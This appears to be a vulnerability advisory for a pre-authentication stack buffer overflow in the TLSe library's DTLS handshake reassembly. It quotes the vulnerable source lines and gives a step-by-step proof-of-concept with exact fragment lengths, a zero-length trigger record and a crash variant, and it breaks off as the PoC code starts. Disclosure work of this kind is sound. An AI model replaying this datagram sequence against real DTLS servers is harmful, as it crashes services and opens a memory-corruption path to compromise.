│  Target: TLSe (tlslayer) — /workspace/source, tlse.c                         │
│                                                                              │
│  Endpoint: tls_consume_stream() — DTLS record path (UDP)                     │
│                                                                              │
│  Method: DTLS                                                                │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  A DTLS peer can overflow a 262,156-byte stack buffer in the TLS record      │
│  parser by sending a short sequence of handshake fragments whose declared    │
│  message length does not match the running sum of the fragment lengths. The  │
│  library accumulates those lengths in                                        │
│  `context->dtls_data->fragment->written` without ever comparing the counter  │
│  against the declared length, then uses the counter as the `memcpy` length   │
│  when the message is reassembled. No authentication, cookie exchange or      │
│  prior handshake state is required.                                          │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated remote sender who can reach a TLSe DTLS endpoint writes  │
│  attacker-controlled bytes past the end of a stack buffer in the process     │
│  that terminates DTLS. Ten small datagrams reach a precise out-of-bounds     │
│  write; a few larger fragments turn it into a multi-kilobyte stack smash     │
│  that crashes the process (observed `SIGSEGV`). Because both the length and  │
│  the content of the overflow are attacker-chosen, this is a stack            │
│  memory-corruption primitive — saved registers, return addresses and         │
│  adjacent locals are all in range — not merely a crash. One malformed        │
│  datagram sequence is enough to terminate a per-connection server process,   │
│  so availability impact is total for that process.                           │
│                                                                              │
│  Technical Analysis                                                          │
│  ## Root cause                                                               │
│                                                                              │
│  DTLS handshake reassembly keeps per-connection state in `struct             │
│  DTLSFragment` (**`tlse.c:1923-1927`**): `char *buffer`, `int len`, `int     │
│  written`.                                                                   │
│                                                                              │
│  When `tls_consume_stream` sees a DTLS handshake record while                │
│  `!context->cipher_spec_set`, it extracts the 24-bit declared message        │
│  length, the fragment offset and the fragment length from the handshake      │
│  header (**`tlse.c:12513-12527`**) and validates `fragment_offset +          │
│  fragment_length <= data_length` and `data_length <=                         │
│  DTLS_MAX_FRAGMENT_SIZE` (`0x40000`, **`tlse.c:763`**). It then copies the   │
│  fragment and adds the fragment length to a running counter:                 │
│                                                                              │
│  ```c title=tlse.c startLineNumber=12543 endLineNumber=12550                 │
│                      fragment_buffer = (char *)TLS_REALLOC(fragment_buffer,  │
│  data_length * sizeof(char *));                                              │
│                      if (!fragment_buffer)                                   │
│                          return TLS_NO_MEMORY;                               │
│                                                                              │
│                      memcpy(fragment_buffer + fragment_offset, &buffer[12],  │
│  fragment_length);                                                           │
│                      context->dtls_data->fragment->buffer =                  │
│  fragment_buffer;                                                            │
│                      context->dtls_data->fragment->len = data_length;        │
│                      context->dtls_data->fragment->written +=                │
│  fragment_length;                                                            │
│  ```                                                                         │
│                                                                              │
│  `written` is a plain accumulator: never capped at `data_length`, and the    │
│  state is released only when `written == len` exactly                        │
│  (**`tlse.c:12552-12555`**). A peer that picks a fragment length which       │
│  never divides the declared length keeps the state alive forever while       │
│  `written` runs far past `data_length`.                                      │
│                                                                              │
│  When the message is finally handed to `tls_parse_payload`, the only guard   │
│  is                                                                          │
│                                                                              │
│  ```c title=tlse.c startLineNumber=9831 endLineNumber=9832                   │
│              if (context->dtls_data->fragment) {                             │
│                  CHECK_SIZE(payload_size - 11,                               │
│  context->dtls_data->fragment->written, TLS_NEED_MORE_DATA)                  │
│  ```                                                                         │
│                                                                              │
│  which merely requires the current record's 24-bit handshake length to be    │
│  greater than or equal to `written` — an attacker sets it to `0`. The        │
│  counter is then used directly as the destination length into a fixed stack  │
│  buffer declared at **`tlse.c:9802`** as `unsigned char                      │
│  local_buffer[DTLS_MAX_FRAGMENT_SIZE + 12]` (262,156 bytes):                 │
│                                                                              │
│  ```c title=tlse.c startLineNumber=9845 endLineNumber=9847                   │
│                  TLS_24_BIT(local_buffer, 9,                                 │
│  context->dtls_data->fragment->written);                                     │
│                                                                              │
│                  memcpy(local_buffer + 12,                                   │
│  context->dtls_data->fragment->buffer,                                       │
│  context->dtls_data->fragment->written);                                     │
│  ```                                                                         │
│                                                                              │
│  Nothing enforces that `written <= 262144`. The sibling                      │
│  `TLS_REALLOC(fragment_buffer, data_length * sizeof(char *))` is             │
│  additionally wrong in the other direction: it over-allocates by             │
│  `sizeof(char *)` (8 on LP64), which masks the overflow for small `written`  │
│  values while allowing a 2 MiB pre-authentication allocation per             │
│  connection.                                                                 │
│                                                                              │
│  ## Reachability                                                             │
│                                                                              │
│  `tls_create_context(1, DTLS_V12)` (**`tlse.c:5815`**) sets `context->dtls   │
│  = 1` and allocates `dtls_data` — the documented way to stand up a DTLS      │
│  server. The server loop calls `tls_consume_stream` with each datagram; the  │
│  bundled `SSL_accept`/`SSL_read` compatibility layer does the same at        │
│  **`tlse.c:14508`**, **`tlse.c:14546`** and **`tlse.c:14622`**. The          │
│  vulnerable block requires only `!context->cipher_spec_set`, so it runs      │
│  before key exchange, certificates or Finished, and the HelloVerifyRequest   │
│  cookie exchange is not required because the fragment bookkeeping happens    │
│  before handshake dispatch.                                                  │
│                                                                              │
│  ## Primitive                                                                │
│                                                                              │
│  Two independent violations occur in the same `memcpy`: the destination      │
│  write past `local_buffer` (attacker-controlled content and length), and —   │
│  when accumulation used a small `data_length` — a heap out-of-bounds read    │
│  of the reassembly buffer, whose contents are then copied onto the stack.    │
│                                                                              │
│  PoC Description                                                             │
│  1. Build the harness (see `poc_script_code`) with AddressSanitizer; it      │
│  `#include`s `tlse.c`, creates a DTLS server context with                    │
│  `tls_create_context(1, DTLS_V12)` and feeds synthetic DTLS records          │
│  directly into `tls_consume_stream()`.                                       │
│  2. Fragment phase: send 10 DTLS records of type `handshake` (`0x16`),       │
│  version `0xFEFD`, epoch `0`, each carrying a handshake header with          │
│  `declared_length = 32771`, `msg_seq = 0`, `fragment_offset = 0`,            │
│  `fragment_length = 26215`. Because 26215 never divides 32771, the           │
│  reassembly state is never released and `fragment->written` grows to 262150  │
│  while `fragment->len` stays 32771.                                          │
│  3. Trigger phase: send one 25-byte DTLS record of type `handshake` with a   │
│  complete (non-fragmented) handshake header whose 24-bit length is `0`.      │
│  That satisfies `CHECK_SIZE(payload_size - 11, written, ...)` and reaches    │
│  `tls_parse_payload`.                                                        │
│  4. Observe `memcpy(local_buffer + 12, fragment->buffer, 262150)` writing 6  │
│  bytes past the 262,156-byte stack buffer; AddressSanitizer reports          │
│  `stack-buffer-overflow WRITE of size 262150` at `tlse.c:9847`.              │
│  5. Hard-crash variant: use `declared_length = 262144` and `fragment_length  │
│  = 65521` for 5 records (`written = 327605`), then the same trigger          │
│  datagram. In an unsanitized build the process dies with `SIGSEGV` on that   │
│  first trigger datagram.                                                     │
│                                                                              │
│  PoC Code                                                                    │
│  ```c                                                                        │
│  /* gcc -O1 -g1 -fno-var-tracking -fsanitize=address,undefined \             │
│   *     -fno-omit-frame-pointer -DTLS_AMALGAMATION -I<tlse-src> \            │
│   *     -o poc_dtls_frag poc_dtls_frag.c                                     │
